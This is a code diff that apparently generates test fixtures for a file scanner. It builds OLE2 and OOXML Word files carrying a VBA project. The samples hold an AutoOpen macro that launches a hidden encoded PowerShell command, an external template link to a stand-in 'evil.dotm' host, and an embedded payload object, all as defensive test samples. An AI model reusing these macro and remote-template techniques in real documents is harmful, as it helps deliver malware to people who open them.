@@ -602,6 +602,242 @@ let deepGz: Uint8Array = evil
 for (let d = 0; d < 40; d++) deepGz = zlib.gzipSync(deepGz)
 archive('deep-40.gz', deepGz, [], false)
 
+// OLE2 compound files ([MS-CFB], version 3, 512-byte sectors) with a VBA project whose dir
+// stream and module source are MS-OVBA compressed ([MS-OVBA] 2.4.1).
+function ovbaCompress(data: Uint8Array): Uint8Array {
+  const out: number[] = [1]
+  for (let start = 0; start < data.length || (start === 0 && data.length === 0); start += 4096) {
+    const chunk = data.subarray(start, start + 4096)
+    const body: number[] = []
+    let pos = 0
+    while (pos < chunk.length) {
+      const flagAt = body.length
+      body.push(0)
+      for (let bit = 0; bit < 8 && pos < chunk.length; bit++) {
+        const bitCount = Math.max(Math.ceil(Math.log2(Math.max(pos, 1))), 4)
+        const maxLen = (0xffff >> bitCount) + 3
+        const maxOff = 1 << bitCount
+        let bestLen = 0
+        let bestOff = 0
+        for (let off = 1; off <= Math.min(pos, maxOff); off++) {
+          let len = 0
+          while (len < maxLen && pos + len < chunk.length && chunk[pos + len] === chunk[pos + len - off]) len++
+          if (len > bestLen) {
+            bestLen = len
+            bestOff = off
+          }
+        }
+        if (bestLen >= 3) {
+          const token = ((bestOff - 1) << (16 - bitCount)) | (bestLen - 3)
+          body.push(token & 0xff, token >> 8)
+          body[flagAt] |= 1 << bit
+          pos += bestLen
+        } else {
+          body.push(chunk[pos++])
+        }
+      }
+    }
+    const header = 0x8000 | 0x3000 | (body.length + 2 - 3)
+    out.push(header & 0xff, header >> 8, ...body)
+    if (data.length === 0) break
+  }
+  return new Uint8Array(out)
+}
+
+interface CfbNode { name: string, data?: Uint8Array, children?: CfbNode[] }
+
+function cfb(top: CfbNode[]): Uint8Array {
+  const S = 512
+  const entries: { name: string, kind: number, child: number, right: number, start: number, size: number }[] = []
+  entries.push({ name: 'Root Entry', kind: 5, child: -1, right: -1, start: -2, size: 0 })
+  const regular: { id: number, data: Uint8Array }[] = []
+  const mini: { id: number, data: Uint8Array }[] = []
+  const add = (nodes: CfbNode[]): number => {
+    let first = -1
+    let prev = -1
+    for (const n of nodes) {
+      const id = entries.length
+      entries.push({ name: n.name, kind: n.children ? 1 : 2, child: -1, right: -1, start: -2, size: n.data?.length ?? 0 })
+      if (n.children) entries[id].child = add(n.children)
+      else if (n.data!.length >= 4096) regular.push({ id, data: n.data! })
+      else if (n.data!.length > 0) mini.push({ id, data: n.data! })
+      if (prev >= 0) entries[prev].right = id
+      else first = id
+      prev = id
+    }
+    return first
+  }
+  entries[0].child = add(top)
+  // Mini stream and mini FAT.
+  const miniParts: Uint8Array[] = []
+  const minifat: number[] = []
+  for (const m of mini) {
+    const n = Math.ceil(m.data.length / 64)
+    entries[m.id].start = minifat.length
+    for (let k = 0; k < n; k++) minifat.push(k === n - 1 ? 0xfffffffe : minifat.length + 1)
+    miniParts.push(concat(m.data, new Uint8Array(n * 64 - m.data.length)))
+  }
+  const miniStream = concat(...miniParts)
+  // Chains of regular sectors, laid out contiguously.
+  const chains: Uint8Array[] = []
+  const chainOwner: number[] = []
+  const pad = (b: Uint8Array) => concat(b, new Uint8Array((S - (b.length % S)) % S))
+  for (const r of regular) {
+    chains.push(pad(r.data))
+    chainOwner.push(r.id)
+  }
+  if (miniStream.length > 0) {
+    chains.push(pad(miniStream))
+    chainOwner.push(0)
+  }
+  const minifatBytes = new Uint8Array(Math.ceil((minifat.length * 4) / S) * S).fill(0xff)
+  new DataView(minifatBytes.buffer).setUint32(0, 0, true)
+  minifat.forEach((v, i) => new DataView(minifatBytes.buffer).setUint32(i * 4, v, true))
+  if (minifat.length > 0) {
+    chains.push(minifatBytes)
+    chainOwner.push(-3)
+  }
+  const dirBytes = new Uint8Array(Math.ceil((entries.length * 128) / S) * S)
+  chains.push(dirBytes)
+  chainOwner.push(-4)
+  const dataSectors = chains.reduce((n, c) => n + c.length / S, 0)
+  let fatSectors = 1
+  while (Math.ceil((dataSectors + fatSectors) / 128) > fatSectors) fatSectors++
+  const fat = new Uint32Array(fatSectors * 128).fill(0xffffffff)
+  let sector = 0
+  const starts: number[] = []
+  for (const c of chains) {
+    const n = c.length / S
+    starts.push(sector)
+    for (let k = 0; k < n; k++) fat[sector + k] = k === n - 1 ? 0xfffffffe : sector + k + 1
+    sector += n
+  }
+  const fatStart = sector
+  for (let k = 0; k < fatSectors; k++) fat[fatStart + k] = 0xfffffffd
+  chains.forEach((_, i) => {
+    const o = chainOwner[i]
+    if (o > 0) entries[o].start = starts[i]
+    if (o === 0) {
+      entries[0].start = starts[i]
+      entries[0].size = miniStream.length
+    }
+  })
+  const minifatStart = chainOwner.indexOf(-3) >= 0 ? starts[chainOwner.indexOf(-3)] : 0xfffffffe
+  const dirStart = starts[chainOwner.indexOf(-4)]
+  const dv = new DataView(dirBytes.buffer)
+  entries.forEach((e, i) => {
+    const o = i * 128
+    const name = e.name
+    for (let k = 0; k < name.length && k < 31; k++) dv.setUint16(o + k * 2, name.charCodeAt(k), true)
+    dv.setUint16(o + 64, (Math.min(name.length, 31) + 1) * 2, true)
+    dirBytes[o + 66] = e.kind
+    dirBytes[o + 67] = 1
+    dv.setUint32(o + 68, 0xffffffff, true)
+    dv.setUint32(o + 72, e.right < 0 ? 0xffffffff : e.right, true)
+    dv.setUint32(o + 76, e.child < 0 ? 0xffffffff : e.child, true)
+    dv.setUint32(o + 116, e.start < 0 ? 0xfffffffe : e.start, true)
+    dv.setUint32(o + 120, e.size, true)
+  })
+  const header = new Uint8Array(512)
+  const hv = new DataView(header.buffer)
+  header.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
+  hv.setUint16(24, 0x3e, true)
+  hv.setUint16(26, 3, true)
+  hv.setUint16(28, 0xfffe, true)
+  hv.setUint16(30, 9, true)
+  hv.setUint16(32, 6, true)
+  hv.setUint32(44, fatSectors, true)
+  hv.setUint32(48, dirStart, true)
+  hv.setUint32(56, 4096, true)
+  hv.setUint32(60, minifatStart, true)
+  hv.setUint32(64, Math.ceil((minifat.length * 4) / S), true)
+  hv.setUint32(68, 0xfffffffe, true)
+  hv.setUint32(72, 0, true)
+  for (let k = 0; k < 109; k++) hv.setUint32(76 + k * 4, k < fatSectors ? fatStart + k : 0xffffffff, true)
+  const fatBytes = new Uint8Array(fat.buffer)
+  return concat(header, ...chains, fatBytes)
+}
+
+function dirRecord(id: number, data: Uint8Array): Uint8Array {
+  return concat(u16(id), u32(data.length), data)
+}
+
+const macroSource = enc.encode('Attribute VB_Name = "Module1"\r\nSub AutoOpen()\r\n  Shell "cmd /c powershell -enc AAAA", 0\r\n  MsgBox "hello hello hello hello"\r\nEnd Sub\r\n')
+const moduleCache = new Uint8Array(37).fill(0xcc)
+const moduleStream = concat(moduleCache, ovbaCompress(macroSource))
+const dirStream = ovbaCompress(concat(
+  dirRecord(0x0001, u32(1)),
+  dirRecord(0x0003, u16(1252)),
+  dirRecord(0x0004, enc.encode('VBAProject')),
+  u16(0x0009), u32(4), u32(0x5f), u16(0x0b),
+  dirRecord(0x000f, u16(1)),
+  dirRecord(0x0013, u16(0xffff)),
+  dirRecord(0x0019, enc.encode('Module1')),
+  dirRecord(0x0047, new Uint8Array([0x4d, 0, 0x6f, 0, 0x64, 0, 0x75, 0, 0x6c, 0, 0x65, 0, 0x31, 0])),
+  dirRecord(0x001a, enc.encode('Module1')),
+  dirRecord(0x0032, new Uint8Array([0x4d, 0, 0x6f, 0, 0x64, 0, 0x75, 0, 0x6c, 0, 0x65, 0, 0x31, 0])),
+  dirRecord(0x001c, new Uint8Array(0)),
+  dirRecord(0x0031, u32(moduleCache.length)),
+  dirRecord(0x001e, u32(0)),
+  dirRecord(0x002c, u16(0)),
+  dirRecord(0x0021, new Uint8Array(0)),
+  dirRecord(0x002b, new Uint8Array(0)),
+  dirRecord(0x0010, new Uint8Array(0)),
+))
+const wordDoc = concat(plain(6000, 21), evil)
+archive('macro.doc', cfb([
+  { name: 'WordDocument', data: wordDoc },
+  { name: '\x05SummaryInformation', data: plain(300, 22) },
+  { name: 'Macros', children: [
+    { name: 'PROJECT', data: enc.encode('ID="{00000000-0000-0000-0000-000000000000}"\r\nModule=Module1\r\n') },
+    { name: 'VBA', children: [
+      { name: '_VBA_PROJECT', data: new Uint8Array([0xcc, 0x61, 0xff, 0xff, 0x00, 0x00, 0x00]) },
+      { name: 'dir', data: dirStream },
+      { name: 'Module1', data: moduleStream },
+    ] },
+  ] },
+]), [
+  { path: 'WordDocument', data: wordDoc },
+  { path: '?SummaryInformation', data: plain(300, 22) },
+  { path: 'Macros/VBA/Module1', data: moduleStream },
+  { path: 'Macros/VBA/macro/Module1', data: macroSource },
+])
+
+// OOXML (ECMA-376 / OPC): a macro-enabled .docm whose vbaProject.bin is a compound file with
+// the VBA storage at its root, an external template relationship and an embedded object; and
+// a plain .docx for contrast.
+const vbaProjectBin = cfb([
+  { name: 'PROJECT', data: enc.encode('ID="{00000000-0000-0000-0000-000000000000}"\r\nModule=Module1\r\n') },
+  { name: 'VBA', children: [
+    { name: '_VBA_PROJECT', data: new Uint8Array([0xcc, 0x61, 0xff, 0xff, 0x00, 0x00, 0x00]) },
+    { name: 'dir', data: dirStream },
+    { name: 'Module1', data: moduleStream },
+  ] },
+])
+const ctMacro = enc.encode('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>')
+const ctPlain = enc.encode('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
+const rootRels = enc.encode('<?xml version="1.0" encoding="UTF-8"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
+const docRels = enc.encode('<?xml version="1.0" encoding="UTF-8"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://templates.example/evil.dotm" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/></Relationships>')
+const docXml = enc.encode('<?xml version="1.0" encoding="UTF-8"?>\n<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Enable content</w:t></w:r></w:p></w:body></w:document>')
+archive('macro.docm', zipBytes([
+  { name: '[Content_Types].xml', data: ctMacro },
+  { name: '_rels/.rels', data: rootRels },
+  { name: 'word/document.xml', data: docXml },
+  { name: 'word/_rels/document.xml.rels', data: docRels },
+  { name: 'word/vbaProject.bin', data: vbaProjectBin },
+  { name: 'word/embeddings/oleObject1.bin', data: evil, method: 0 },
+]), [
+  { path: 'word/document.xml', data: docXml },
+  { path: 'word/vbaProject.bin', data: vbaProjectBin },
+  { path: 'word/vbaProject.bin/VBA/macro/Module1', data: macroSource },
+  { path: 'word/embeddings/oleObject1.bin', data: evil },
+])
+archive('plain.docx', zipBytes([
+  { name: '[Content_Types].xml', data: ctPlain },
+  { name: '_rels/.rels', data: rootRels },
+  { name: 'word/document.xml', data: docXml },
+]), [{ path: 'word/document.xml', data: docXml }])
+
 // ---------------------------------------------------------------------------------------------
 // Executables (P5.05 PE, P5.06 ELF and Mach-O), built from the format specifications.
 
